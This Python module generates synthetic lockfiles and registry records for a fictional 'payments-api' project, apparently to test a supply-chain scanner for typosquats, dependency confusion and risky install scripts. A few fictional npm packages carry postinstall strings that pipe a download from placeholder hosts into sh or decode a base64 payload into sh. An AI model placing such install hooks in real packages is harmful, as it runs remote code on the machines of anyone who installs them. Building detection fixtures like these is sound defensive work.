"""Synthetic "payments-api" project: lockfiles + fixture registry records.

Everything here is invented. Popular package names are real public projects (so the clean majority looks
realistic); every suspicious-looking name, maintainer and script is fictional. Output is fully deterministic.
"""
from __future__ import annotations

import base64
import hashlib
import json
from datetime import datetime, timedelta, timezone

from ..models import Ecosystem, InstallScripts
from ..registries.base import RegistryRecord

DEMO_SCAN_DATE = datetime(2026, 9, 28, 9, 30, 0, tzinfo=timezone.utc)
PROJECT = "payments-api"


def ago(days: int) -> str:
    return (DEMO_SCAN_DATE - timedelta(days=days)).strftime("%Y-%m-%dT%H:%M:%SZ")


def _h(s: str) -> int:
    return int(hashlib.sha256(s.encode()).hexdigest(), 16)


def _version(name: str, known: dict[str, str]) -> str:
    if name in known:
        return known[name]
    h = _h(name)
    return f"{1 + h % 4}.{(h >> 4) % 18}.{(h >> 9) % 12}"


def _sri(name: str, version: str) -> str:
    return "sha512-" + base64.b64encode(hashlib.sha512(f"{name}@{version}".encode()).digest()).decode()


def _hex(name: str, version: str, alg: str = "sha256") -> str:
    return hashlib.new(alg, f"{name}@{version}".encode()).hexdigest()


def _old_date(name: str) -> str:
    h = _h("date:" + name)
    return f"{2012 + h % 9}-{1 + (h >> 4) % 12:02d}-{1 + (h >> 8) % 27:02d}T{(h >> 12) % 24:02d}:{(h >> 16) % 60:02d}:00Z"


def clean_record(eco: Ecosystem, name: str, version: str, scripts: InstallScripts | None = None) -> RegistryRecord:
    h = _h("rec:" + name)
    base = name.split("/")[-1].lstrip("@")
    return RegistryRecord(
        ecosystem=eco, name=name, registered_at=_old_date(name), latest_version=version,
        latest_published_at=ago(20 + h % 300), versions=[version],
        weekly_downloads=(2_000_000 + (h % 60) * 1_500_000) if eco is not Ecosystem.GO else None,
        maintainers=[f"{base}-maintainers", f"{base}-release-bot"][: 1 + h % 2],
        install_scripts=scripts or InstallScripts(), description=f"{base} (synthetic registry record)",
        repository_url=f"https://github.com/{base}-project/{base}" if eco is not Ecosystem.GO else None,
    )


# ----------------------------------------------------------------------------------------------------------
# npm
# ----------------------------------------------------------------------------------------------------------
NPM_KNOWN = {
    "react": "18.2.0", "react-dom": "18.2.0", "express": "4.18.2", "lodash": "4.17.21", "axios": "1.6.2",
    "typescript": "5.2.2", "webpack": "5.89.0", "jest": "29.7.0", "eslint": "8.53.0", "prettier": "3.0.3",
    "moment": "2.29.4", "dotenv": "16.3.1", "commander": "11.1.0", "chalk": "4.1.2", "uuid": "9.0.1",
    "cors": "2.8.5", "helmet": "7.1.0", "jsonwebtoken": "9.0.2", "mongoose": "8.0.0", "pg": "8.11.3",
    "redis": "4.6.10", "winston": "3.11.0", "socket.io": "4.7.2", "dayjs": "1.11.10", "zod": "3.22.4",
    "rxjs": "7.8.1", "esbuild": "0.19.5", "core-js": "3.33.2", "tslib": "2.6.2", "debug": "4.3.4", "ms": "2.1.3",
    "qs": "6.11.2", "semver": "7.5.4", "body-parser": "1.20.2", "cookie-parser": "1.4.6",
}
NPM_DIRECT = ["react", "react-dom", "express", "lodash", "axios", "commander", "moment", "typescript", "webpack",
              "jest", "eslint", "prettier", "dotenv", "chalk", "uuid", "cors", "helmet", "jsonwebtoken", "mongoose",
              "pg", "redis", "winston", "socket.io", "dayjs", "zod", "rxjs", "esbuild"]
NPM_DEV = {"typescript", "webpack", "jest", "eslint", "prettier", "esbuild"}
NPM_TRANSITIVE = ["tslib", "debug", "ms", "qs", "semver", "glob", "minimist", "mkdirp", "inherits", "safe-buffer",
                  "readable-stream", "iconv-lite", "mime-types", "mime-db", "negotiator", "accepts", "content-type",
                  "depd", "statuses", "http-errors", "on-finished", "body-parser", "cookie-parser", "async",
                  "bluebird", "underscore", "core-js", "js-yaml", "yargs", "fs-extra", "rimraf", "chokidar",
                  "form-data", "node-fetch", "ws"]
NPM_NO_INTEGRITY = {"safe-buffer"}
NPM_PRIVATE = [("@acme/logger", "2.3.1"), ("@acme/config-loader", "1.9.0"), ("@acme/http-client", "3.4.2"),
               ("@acme/telemetry", "0.12.5"), ("@acme/feature-flags", "1.2.0"), ("@acme/errors", "2.0.1"),
               ("@acme/db-kit", "4.1.0"), ("@acme/queue-client", "1.7.3"), ("@acme/authz", "2.5.0")]
NPM_PRIVATE_DIRECT = {"@acme/logger", "@acme/http-client", "@acme/feature-flags", "@acme/db-kit"}
NPM_REGISTRY = "https://registry.npmjs.org"
NPM_PRIVATE_REGISTRY = "https://npm.acme.corp/repository/npm"
GIT_SHA = "9f2c1a7d5b3e48601a9c2e77d4b8f0a1c3d5e6f7"

# (name, version, registered_days_ago, downloads, maintainers, maintainer_changes, scripts(dict), indicators, deprecated, latest)
NPM_SUSPICIOUS = {
    "crossenv": dict(version="6.1.1", reg=24, dl=96, maint=["cx-tools-9"], scripts={"postinstall": "node setup.js && curl -s http://cdn.crossenv-pkg.example/i.sh | sh"},
                     ind=["curl in postinstall", "http:// URL in postinstall"]),
    "lodahs": dict(version="1.0.2", reg=200, dl=210, maint=["lodahs-pub"]),
    "colour-mixr": dict(version="3.2.0", reg=19, dl=64, maint=["colour-mixr-team"], scripts={"postinstall": "curl -s http://cdn.colour-mixr.example/p.sh | sh"},
                        ind=["curl in postinstall", "http:// URL in postinstall"]),
    "pdf-render-kit": dict(version="4.0.3", reg=1700, dl=800, maint=["pdfrk-a", "pdfrk-b"], mchg=1, scripts={"postinstall": "node scripts/fetch-binaries.js"}, latest="7.1.0"),
    "chartlet-dom": dict(version="1.8.0", reg=1400, dl=450, maint=["chartlet-team"], deprecated=True),
    "queue-ticker": dict(version="2.2.1", reg=150, dl=700, maint=["qt-dev-1", "qt-dev-2"], mchg=2),
    "fast-slugger": dict(version="0.9.4", reg=100, dl=900, maint=["slugger-dev"]),
    "yaml-merge-cli": dict(version="1.3.0", reg=900, dl=90, maint=["ymc-team", "ymc-ops"], scripts={"postinstall": "echo $PAYLOAD | base64 -d | sh"},
                           ind=["base64 decode in postinstall"]),
    "legacy-tracker": dict(version="0.9.4", reg=3300, dl=30_000, maint=["legacy-tracker-team"]),
    "acme-ui-kit": dict(version="0.8.0"),
    "acme-eslint-rules": dict(version="1.1.0"),
    "chart-lite": dict(version="1.4.2"),
}
NPM_LOCAL = [("@payments/shared", "packages/shared"), ("@payments/ui", "packages/ui"), ("@payments/config", "packages/config")]


def _npm_url(name: str, version: str, base: str = NPM_REGISTRY) -> str:
    bare = name.split("/")[-1]
    return f"{base}/{name}/-/{bare}-{version}.tgz"


def build_npm() -> tuple[str, list[RegistryRecord]]:
    ecos = Ecosystem.NPM
    pk: dict[str, dict] = {}
    records: list[RegistryRecord] = []
    root_deps: dict[str, str] = {}
    root_dev: dict[str, str] = {}
    versions: dict[str, str] = {}
    all_clean = NPM_DIRECT + [t for t in NPM_TRANSITIVE if t not in NPM_DIRECT]
    for n in all_clean:
        versions[n] = _version(n, NPM_KNOWN)

    # graph: transitive packages hang off direct ones (deterministic)
    deps: dict[str, dict[str, str]] = {n: {} for n in all_clean}
    trans = [t for t in NPM_TRANSITIVE if t not in NPM_DIRECT]
    direct_pool = [d for d in NPM_DIRECT if d not in NPM_DEV] + list(NPM_DEV)
    for i, t in enumerate(trans):
        parent = direct_pool[i % len(direct_pool)]
        deps[parent][t] = "^" + versions[t]
        if i % 4 == 0:
            p2 = direct_pool[(i * 3 + 1) % len(direct_pool)]
            if p2 != t:
                deps[p2][t] = "^" + versions[t]
        if i >= 6 and i % 3 == 0:
            q = trans[i // 2]
            if q != t:
                deps[q][t] = "^" + versions[t]
    for n in all_clean:
        v = versions[n]
        e: dict = {"version": v, "resolved": _npm_url(n, v), "integrity": _sri(n, v)}
        if n in NPM_NO_INTEGRITY:
            e.pop("integrity")
        if n in NPM_DEV:
            e["dev"] = True
        if deps[n]:
            e["dependencies"] = dict(sorted(deps[n].items()))
        pk[f"node_modules/{n}"] = e
        scripts = None
        if n == "esbuild":
            scripts = InstallScripts(postinstall="node install.js")
        if n == "core-js":
            scripts = InstallScripts(postinstall="node -e \"try{require('./postinstall')}catch(e){}\"")
        records.append(clean_record(ecos, n, v, scripts))
        if n in NPM_DIRECT:
            (root_dev if n in NPM_DEV else root_deps)[n] = "latest" if n == "dotenv" else "^" + v

    # private @acme packages from the private registry (hashed, exact)
    for n, v in NPM_PRIVATE:
        e = {"version": v, "resolved": _npm_url(n, v, NPM_PRIVATE_REGISTRY), "integrity": _sri(n, v)}
        sub = {t: "^" + versions[t] for t in ("tslib", "uuid") if n in ("@acme/logger", "@acme/http-client", "@acme/db-kit")}
        if sub:
            e["dependencies"] = sub
        pk[f"node_modules/{n}"] = e
        if n in NPM_PRIVATE_DIRECT:
            root_deps[n] = "^" + v
    for n, v in NPM_PRIVATE:
        if n not in NPM_PRIVATE_DIRECT:
            parent = "@acme/http-client"
            pk[f"node_modules/{parent}"].setdefault("dependencies", {})[n] = "^" + v

    # DC-1: internal-looking, not registered publicly, resolved by range (no resolved/integrity recorded)
    pk["node_modules/@acme/internal-utils"] = {"version": "2.1.0"}
    root_deps["@acme/internal-utils"] = "^2.1.0"

    # suspicious / exposure-shaped packages
    for n, spec in NPM_SUSPICIOUS.items():
        v = spec["version"]
        if n in ("acme-ui-kit", "acme-eslint-rules", "chart-lite"):
            continue
        e = {"version": v, "resolved": _npm_url(n, v), "integrity": _sri(n, v)}
        if n == "legacy-tracker":
            e = {"version": v, "resolved": _npm_url(n, v).replace("https://", "http://")}
        if spec.get("scripts"):
            e["hasInstallScript"] = True
        pk[f"node_modules/{n}"] = e
        root_deps[n] = "^" + v
        sc = spec.get("scripts") or {}
        records.append(RegistryRecord(
            ecosystem=ecos, name=n, registered_at=ago(spec.get("reg", 2000)), latest_version=spec.get("latest", v),
            latest_published_at=ago(min(spec.get("reg", 2000), 30)), versions=[v], weekly_downloads=spec.get("dl"),
            maintainers=spec.get("maint", []), maintainer_changes=spec.get("mchg", 0),
            install_scripts=InstallScripts(**{k: sc.get(k) for k in ("preinstall", "install", "postinstall", "prepare")}),
            network_indicators=spec.get("ind", []), deprecated=spec.get("deprecated", False),
            description=f"{n} (synthetic, fictional package)",
        ))
    # git / tarball dependencies
    pk["node_modules/acme-ui-kit"] = {"version": "0.8.0", "resolved": "git+ssh://git@github.com/acme-labs/ui-kit.git#main"}
    root_deps["acme-ui-kit"] = "github:acme-labs/ui-kit#main"
    pk["node_modules/acme-eslint-rules"] = {"version": "1.1.0", "resolved": f"git+ssh://git@github.com/acme-labs/eslint-rules.git#{GIT_SHA}"}
    root_dev["acme-eslint-rules"] = f"github:acme-labs/eslint-rules#{GIT_SHA}"
    pk["node_modules/chart-lite"] = {"version": "1.4.2", "resolved": "https://cdn.example.net/vendor/chart-lite-1.4.2.tgz",
                                     "integrity": _sri("chart-lite", "1.4.2")}
    root_deps["chart-lite"] = "https://cdn.example.net/vendor/chart-lite-1.4.2.tgz"
    # workspace packages
    for n, path in NPM_LOCAL:
        pk[f"node_modules/{n}"] = {"resolved": path, "link": True}
        pk[path] = {"name": n, "version": "1.0.0", "dependencies": {"lodash": "^4.17.21"}}
        root_deps[n] = "*"

    # simple cross-links so private/suspicious packages have a place in the graph
    pk["node_modules/express"].setdefault("dependencies", {})["legacy-tracker"] = "^0.9.4"
    pk["node_modules/react"].setdefault("dependencies", {})["fast-slugger"] = "^0.9.4"
    pk["node_modules/axios"].setdefault("dependencies", {})["queue-ticker"] = "^2.2.1"

    root = {"name": PROJECT, "version": "1.0.0", "dependencies": dict(sorted(root_deps.items())),
            "devDependencies": dict(sorted(root_dev.items()))}
    ordered = {"": root}
    for k in sorted(pk):
        ordered[k] = pk[k]
    lock = {"name": PROJECT, "version": "1.0.0", "lockfileVersion": 3, "requires": True, "packages": ordered}
    return json.dumps(lock, indent=2), records


# ----------------------------------------------------------------------------------------------------------
# PyPI
# ----------------------------------------------------------------------------------------------------------
PYPI_KNOWN = {"requests": "2.31.0", "flask": "3.0.0", "sqlalchemy": "2.0.23", "pydantic": "2.5.1", "fastapi": "0.104.1",
              "uvicorn": "0.24.0", "celery": "5.3.4", "redis": "5.0.1", "boto3": "1.29.7", "pandas": "2.1.3",
              "numpy": "1.26.2", "pytest": "7.4.3", "black": "23.11.0", "gunicorn": "21.2.0", "urllib3": "2.1.0",
              "certifi": "2023.11.17", "idna": "3.4", "charset-normalizer": "3.3.2", "werkzeug": "3.0.1",
              "jinja2": "3.1.2", "markupsafe": "2.1.3", "click": "8.1.7", "itsdangerous": "2.1.2", "python-dateutil": "2.8.2"}
PYPI_DIRECT = ["requests", "flask", "sqlalchemy", "pydantic", "fastapi", "uvicorn", "celery", "redis", "boto3",
               "pandas", "numpy", "pytest", "black", "gunicorn"]
PYPI_TRANSITIVE = {
    "urllib3": ["requests", "botocore"], "certifi": ["requests"], "idna": ["requests"], "charset-normalizer": ["requests"],
    "werkzeug": ["flask"], "jinja2": ["flask"], "markupsafe": ["jinja2", "werkzeug"], "click": ["flask", "black", "celery"],
    "itsdangerous": ["flask"], "greenlet": ["sqlalchemy"], "typing-extensions": ["sqlalchemy", "pydantic"],
    "starlette": ["fastapi"], "botocore": ["boto3"], "s3transfer": ["boto3"], "jmespath": ["boto3", "botocore"],
    "python-dateutil": ["pandas", "botocore", "celery"], "six": ["python-dateutil"], "pytz": ["pandas"],
    "kombu": ["celery"], "amqp": ["kombu"], "packaging": ["pytest", "gunicorn", "black"], "pluggy": ["pytest"],
    "iniconfig": ["pytest"], "pyyaml": ["kombu"], "attrs": ["pytest"], "cffi": ["cryptography"],
    "pycparser": ["cffi"], "cryptography": ["boto3"], "psycopg2-binary": ["sqlalchemy"],
}


def build_pypi() -> tuple[str, list[RegistryRecord]]:
    ecos = Ecosystem.PYPI
    records: list[RegistryRecord] = []
    lines = [
        "#", "# This file is autogenerated by pip-compile", "#", "#    pip-compile requirements.in", "#",
        "--extra-index-url https://pypi.acme.corp/simple", "",
    ]

    def add(name: str, version: str, via: list[str], scripts: InstallScripts | None = None) -> None:
        lines.append(f"{name}=={version}")
        if not via:
            lines.append("    # via -r requirements.in")
        elif len(via) == 1:
            lines.append(f"    # via {via[0]}")
        else:
            lines.append("    # via")
            lines.extend(f"    #   {v}" for v in via)

    for n in PYPI_DIRECT:
        v = _version(n, PYPI_KNOWN)
        add(n, v, [])
        records.append(clean_record(ecos, n, v))
    for n, parents in PYPI_TRANSITIVE.items():
        v = _version(n, PYPI_KNOWN)
        add(n, v, parents)
        records.append(clean_record(ecos, n, v))
    # DC-2: internal-looking, unpinned range, mixed index
    lines.append("acme-internal-auth>=1.4")
    lines.append("    # via -r requirements.in")
    # typosquats
    lines.append("requets==2.28.0"); lines.append("    # via -r requirements.in")
    lines.append("python-dateutl==2.8.2"); lines.append("    # via -r requirements.in")
    # metadata-suspicious
    for n, v in (("pycolorize-ng", "0.4.1"), ("tabletext-lite", "1.2.0"), ("logmark", "0.3.9"), ("isodate-fast", "2.0.0")):
        lines.append(f"{n}=={v}"); lines.append("    # via -r requirements.in")
    # VCS + local
    lines.append("git+https://github.com/example-labs/pdfx.git@main#egg=pdfx")
    lines.append("-e ./libs/payments-common")

    records += [
        RegistryRecord(ecosystem=ecos, name="requets", registered_at=ago(33), latest_version="2.28.0", versions=["2.28.0"],
                       weekly_downloads=41, maintainers=["rq-mirror-9"], install_scripts=InstallScripts(build_script=True),
                       description="HTTP for humans, fast (synthetic look-alike)"),
        RegistryRecord(ecosystem=ecos, name="python-dateutl", registered_at=ago(300), latest_version="2.8.2", versions=["2.8.2"],
                       weekly_downloads=720, maintainers=["dateutl-dev"], description="Extensions to datetime (synthetic look-alike)"),
        RegistryRecord(ecosystem=ecos, name="pycolorize-ng", registered_at=ago(25), latest_version="0.4.1", versions=["0.4.0", "0.4.1"],
                       weekly_downloads=55, maintainers=["pycolorize-ng-dev"], install_scripts=InstallScripts(build_script=True),
                       network_indicators=["curl in setup.py"], description="Colour your terminal (synthetic)"),
        RegistryRecord(ecosystem=ecos, name="tabletext-lite", registered_at=ago(70), latest_version="1.2.0", versions=["1.2.0"],
                       weekly_downloads=300, maintainers=["tabletext-dev"], install_scripts=InstallScripts(build_script=True),
                       deprecated=True, description="Tiny text tables (synthetic)"),
        RegistryRecord(ecosystem=ecos, name="logmark", registered_at=ago(150), latest_version="0.3.9", versions=["0.3.9"],
                       weekly_downloads=500, maintainers=["logmark-dev"], install_scripts=InstallScripts(build_script=True),
                       description="Log markers (synthetic)"),
        RegistryRecord(ecosystem=ecos, name="isodate-fast", registered_at=ago(1200), latest_version="2.0.0", versions=["1.0.0", "2.0.0"],
                       weekly_downloads=12_000, maintainers=["isodate-fast-dev"], maintainer_changes=1,
                       description="Fast ISO-8601 parsing (synthetic)"),
    ]
    return "\n".join(lines) + "\n", records


# ----------------------------------------------------------------------------------------------------------
# Go
# ----------------------------------------------------------------------------------------------------------
GO_DIRECT = [("github.com/gin-gonic/gin", "v1.9.1"), ("github.com/spf13/cobra", "v1.8.0"), ("github.com/spf13/viper", "v1.17.0"),
             ("github.com/sirupsen/logrus", "v1.9.3"), ("github.com/stretchr/testify", "v1.8.4"), ("github.com/google/uuid", "v1.4.0"),
             ("github.com/go-redis/redis", "v6.15.9+incompatible"), ("github.com/lib/pq", "v1.10.9"),
             ("github.com/prometheus/client_golang", "v1.17.0"), ("google.golang.org/grpc", "v1.59.0")]
GO_INDIRECT = [("golang.org/x/net", "v0.18.0"), ("golang.org/x/sys", "v0.14.0"), ("golang.org/x/text", "v0.14.0"),
               ("golang.org/x/crypto", "v0.15.0"), ("golang.org/x/sync", "v0.5.0"), ("google.golang.org/protobuf", "v1.31.0"),
               ("gopkg.in/yaml.v3", "v3.0.1"), ("github.com/pkg/errors", "v0.9.1"), ("github.com/davecgh/go-spew", "v1.1.1"),
               ("github.com/pmezard/go-difflib", "v1.0.0"), ("github.com/fsnotify/fsnotify", "v1.7.0"),
               ("github.com/mattn/go-isatty", "v0.0.20"), ("github.com/json-iterator/go", "v1.1.12"),
               ("github.com/modern-go/reflect2", "v1.0.2")]


def build_go() -> tuple[str, str, list[RegistryRecord]]:
    ecos = Ecosystem.GO
    records: list[RegistryRecord] = []
    direct_extra = [("github.com/dgrijalva/jwt-go", "v3.2.0+incompatible"), ("github.com/dx-labs/gostat", "v0.3.1"),
                    ("github.com/dx-labs/ratewin", "v1.0.2"), ("github.com/acme-labs/payments-shared", "v0.0.0")]
    mod = ["module github.com/acme-labs/payments-api", "", "go 1.22", "", "require ("]
    mod += [f"\t{n} {v}" for n, v in GO_DIRECT + direct_extra]
    mod += [")", "", "require ("] + [f"\t{n} {v} // indirect" for n, v in GO_INDIRECT] + [")", ""]
    mod += ["replace github.com/dgrijalva/jwt-go => github.com/golang-jwt/jwt v3.2.2+incompatible",
            "replace github.com/acme-labs/payments-shared => ../payments-shared", ""]
    sums = []
    for n, v in GO_DIRECT + GO_INDIRECT + direct_extra[1:3]:
        sums.append(f"{n} {v} h1:{base64.b64encode(hashlib.sha256((n + v).encode()).digest()).decode()}")
        sums.append(f"{n} {v}/go.mod h1:{base64.b64encode(hashlib.sha256((n + v + 'mod').encode()).digest()).decode()}")
    for n, v in GO_DIRECT + GO_INDIRECT:
        records.append(clean_record(ecos, n, v))
    records += [
        RegistryRecord(ecosystem=ecos, name="github.com/dx-labs/gostat", registered_at=ago(30), latest_version="v0.3.1", versions=["v0.3.1"],
                       description="Stat helpers (synthetic)"),
        RegistryRecord(ecosystem=ecos, name="github.com/dx-labs/ratewin", registered_at=ago(75), latest_version="v1.0.2", versions=["v1.0.2"],
                       description="Sliding-window rate limiter (synthetic)"),
    ]
    return "\n".join(mod), "\n".join(sums) + "\n", records


# ----------------------------------------------------------------------------------------------------------
# Rust
# ----------------------------------------------------------------------------------------------------------
CRATES_INDEX = "registry+https://github.com/rust-lang/crates.io-index"
RUST_CLEAN = {
    "tokio": ("1.34.0", ["bytes", "mio"]), "serde": ("1.0.192", []), "serde_json": ("1.0.108", ["serde"]),
    "reqwest": ("0.11.22", ["hyper", "http", "tokio", "serde_json"]), "clap": ("4.4.8", []), "anyhow": ("1.0.75", []),
    "tracing": ("0.1.40", ["once_cell"]), "bytes": ("1.5.0", []), "futures-core": ("0.3.29", []),
    "hyper": ("0.14.27", ["http", "bytes", "futures-core"]), "http": ("0.2.11", ["bytes"]), "mio": ("0.8.9", []),
    "once_cell": ("1.18.0", []), "syn": ("2.0.39", []),
}
RUST_DIRECT = ["tokio", "serde", "serde_json", "reqwest", "clap", "anyhow", "tracing"]


def build_rust() -> tuple[str, list[RegistryRecord]]:
    ecos = Ecosystem.RUST
    records: list[RegistryRecord] = []
    extra_direct = ["acme-platform-core", "lazy_statik", "tinyring", "blockhound-lite", "tinycache", "payments-shared"]
    out = ["# This file is automatically @generated by Cargo.", "# It is not intended for manual editing.", "version = 3", ""]
    out += ["[[package]]", 'name = "payments-api"', 'version = "0.1.0"', "dependencies = ["]
    out += [f' "{n}",' for n in RUST_DIRECT + extra_direct] + ["]", ""]
    blocks: list[str] = []

    def crate(name: str, ver: str, deps: list[str], source: str | None = CRATES_INDEX, checksum: bool = True) -> None:
        b = ["[[package]]", f'name = "{name}"', f'version = "{ver}"']
        if source:
            b.append(f'source = "{source}"')
        if checksum:
            b.append(f'checksum = "{_hex(name, ver)}"')
        if deps:
            b.append("dependencies = [")
            b += [f' "{d}",' for d in deps]
            b.append("]")
        blocks.append("\n".join(b) + "\n")

    for n, (v, deps) in RUST_CLEAN.items():
        crate(n, v, deps)
        records.append(clean_record(ecos, n, v))
    crate("acme-platform-core", "0.4.2", [])
    crate("lazy_statik", "1.4.0", [])
    crate("tinyring", "0.2.0", [])
    crate("blockhound-lite", "0.1.7", [])
    crate("tinycache", "0.5.1", [], source="git+https://github.com/example-labs/tinycache?branch=main#" + GIT_SHA, checksum=False)
    crate("payments-shared", "0.1.0", [], source=None, checksum=False)
    blocks.sort(key=lambda b: b.split('name = "')[1].split('"')[0])
    records += [
        RegistryRecord(ecosystem=ecos, name="acme-platform-core", registered_at=ago(41), latest_version="0.4.2", versions=["0.4.2"],
                       weekly_downloads=9, maintainers=["acme-platform-owner"], description="Platform core (registered by an unknown party)"),
        RegistryRecord(ecosystem=ecos, name="lazy_statik", registered_at=ago(30), latest_version="1.4.0", versions=["1.4.0"],
                       weekly_downloads=25, maintainers=["lstatik-dev"], description="Lazily evaluated statics (synthetic look-alike)"),
        RegistryRecord(ecosystem=ecos, name="tinyring", registered_at=ago(60), latest_version="0.2.0", versions=["0.2.0"],
                       weekly_downloads=40, maintainers=["tinyring-dev"], install_scripts=InstallScripts(build_script=True),
                       description="Tiny ring buffer (synthetic)"),
        RegistryRecord(ecosystem=ecos, name="blockhound-lite", registered_at=ago(100), latest_version="0.1.7", versions=["0.1.7"],
                       weekly_downloads=300, maintainers=["blockhound-dev"], install_scripts=InstallScripts(build_script=True),
                       deprecated=True, description="Blocking-call detector (synthetic)"),
    ]
    return "\n".join(out) + "\n" + "\n".join(blocks), records


# ----------------------------------------------------------------------------------------------------------
# look-alike registrations (fictional, for the look-alike groups)
# ----------------------------------------------------------------------------------------------------------
def build_lookalikes() -> list[RegistryRecord]:
    P, N = Ecosystem.PYPI, Ecosystem.NPM
    return [
        RegistryRecord(ecosystem=P, name="requsets", registered_at=ago(21), latest_version="0.0.3", versions=["0.0.1", "0.0.3"],
                       weekly_downloads=12, maintainers=["pypi-helper-77"], install_scripts=InstallScripts(build_script=True),
                       description="Simple HTTP library (synthetic look-alike)"),
        RegistryRecord(ecosystem=P, name="reqquests", registered_at=ago(210), latest_version="2.9.0", versions=["2.9.0"],
                       weekly_downloads=380, maintainers=["dev-tools-lab"], description="requests but faster (synthetic look-alike)"),
        RegistryRecord(ecosystem=P, name="reqests", registered_at=ago(600), latest_version="1.0.0", versions=["1.0.0"],
                       weekly_downloads=1900, maintainers=["reqests-maint"], deprecated=True, description="Deprecated fork (synthetic)"),
        RegistryRecord(ecosystem=P, name="requ3sts", registered_at=ago(9), latest_version="0.1.0", versions=["0.1.0"],
                       weekly_downloads=3, maintainers=["r3q-tools"], install_scripts=InstallScripts(build_script=True),
                       network_indicators=["curl in setup.py"], description="requests (synthetic look-alike)"),
        RegistryRecord(ecosystem=P, name="python-requests", registered_at=ago(1100), latest_version="2.31.0", versions=["2.31.0"],
                       weekly_downloads=12_400, maintainers=["python-req-org"], description="Mirror of requests (synthetic)"),
        RegistryRecord(ecosystem=P, name="python_requests", registered_at=ago(45), latest_version="0.9.1", versions=["0.9.1"],
                       weekly_downloads=88, maintainers=["pyreq-labs"], install_scripts=InstallScripts(build_script=True),
                       description="Requests for Python (synthetic look-alike)"),
        RegistryRecord(ecosystem=N, name="lodash-js", registered_at=ago(1100), latest_version="4.17.11", versions=["4.17.11"],
                       weekly_downloads=5100, maintainers=["lodash-js-legacy"], description="Legacy lodash mirror (synthetic)"),
        RegistryRecord(ecosystem=N, name="1odash", registered_at=ago(12), latest_version="4.17.99", versions=["4.17.99"],
                       weekly_downloads=6, maintainers=["od4sh-tools"], install_scripts=InstallScripts(postinstall="node lib/init.js"),
                       network_indicators=["curl in postinstall"], description="lodash utility (synthetic look-alike)"),
        RegistryRecord(ecosystem=N, name="expresss", registered_at=ago(80), latest_version="4.18.3", versions=["4.18.3"],
                       weekly_downloads=140, maintainers=["exp-web-1"], description="Fast web framework (synthetic look-alike)"),
        RegistryRecord(ecosystem=N, name="exress", registered_at=ago(500), latest_version="0.0.2", versions=["0.0.2"],
                       weekly_downloads=35, maintainers=["exress-dev"], description="express typo (synthetic)"),
        RegistryRecord(ecosystem=N, name="axios-js", registered_at=ago(2000), latest_version="0.5.0", versions=["0.5.0"],
                       weekly_downloads=41_000, maintainers=["axios-js-team"], description="Old axios wrapper (synthetic)"),
    ]


def requests_record() -> RegistryRecord:
    """The real `requests` gets a hand-tuned record (highest downloads in the dataset)."""
    return RegistryRecord(ecosystem=Ecosystem.PYPI, name="requests", registered_at="2011-02-13T18:38:17Z",
                          latest_version="2.31.0", latest_published_at=ago(120), versions=["2.30.0", "2.31.0"],
                          weekly_downloads=61_000_000, maintainers=["requests-maintainers"],
                          description="Python HTTP for Humans (synthetic record)")
